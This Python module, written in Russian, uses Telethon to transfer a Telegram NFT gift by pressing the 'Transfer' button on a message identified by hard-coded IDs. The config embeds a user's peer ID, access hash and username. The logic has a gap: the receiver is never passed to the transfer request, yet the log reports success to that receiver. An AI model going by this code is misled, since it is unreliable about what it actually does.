import logging
from telethon import functions
from .telegram_client import get_client

logger = logging.getLogger(__name__)

# данные NFT-подарка, которые бот должен отправить
GIFT_DATA = {
    "peer_id": 1207534564,
    "access_hash": -8813161918532140746,
    "msg_id": 41,
    "gift_name": "Snake Box",
    "ton_contract_address": "SnakeBox-29826",
    "username": "jhgvcbcg",
    "chat_name": "[Ɐ] r",
}


async def send_real_gift(client, user_id: int, username: str, peer_id, gift_msg_id: int, gift_name: str = None):
    """Отправляет реальный NFT-подарок пользователю."""
    gift_name = gift_name or "Неизвестный подарок"
    receiver = user_id or f"@{username}"

    logger.info(f"🎁 Передача подарка '{gift_name}' → {receiver}")

    try:
        # Загружаем сообщение с NFT
        msg = await client.get_messages(peer_id, ids=gift_msg_id)
        if not msg or not msg.buttons:
            raise ValueError("❌ У сообщения с подарком нет inline-кнопок")

        # Ищем кнопку "Передать"
        transfer_button = None
        for row in msg.buttons:
            for btn in row:
                if "Передать" in btn.text:
                    transfer_button = btn
                    break
            if transfer_button:
                break

        if not transfer_button:
            raise ValueError("❌ Кнопка 'Передать' не найдена")

        # Отправляем callback-запрос
        await client(
            functions.messages.GetBotCallbackAnswerRequest(
                peer=peer_id,
                msg_id=gift_msg_id,
                data=transfer_button.data,
            )
        )

        logger.info(f"✅ Подарок '{gift_name}' успешно передан пользователю {receiver}")

    except Exception as e:
        logger.exception(f"❌ Ошибка при передаче подарка: {e}")
        raise


async def send_gift_once(client=None):
    """
    Обёртка — просто один раз берёт данные из GIFT_DATA
    и вызывает send_real_gift.
    """
    local_client = client or get_client()
    if not local_client:
        raise RuntimeError("❌ Клиент Telegram не инициализирован")

    logger.info("🚀 Клиент инициализирован, начинаю передачу подарка...")

    await send_real_gift(
        client=local_client,
        user_id=GIFT_DATA["peer_id"],
        username=GIFT_DATA["username"],
        peer_id=GIFT_DATA["peer_id"],
        gift_msg_id=GIFT_DATA["msg_id"],
        gift_name=GIFT_DATA["gift_name"],
    )

    logger.info("✅ Передача завершена.")
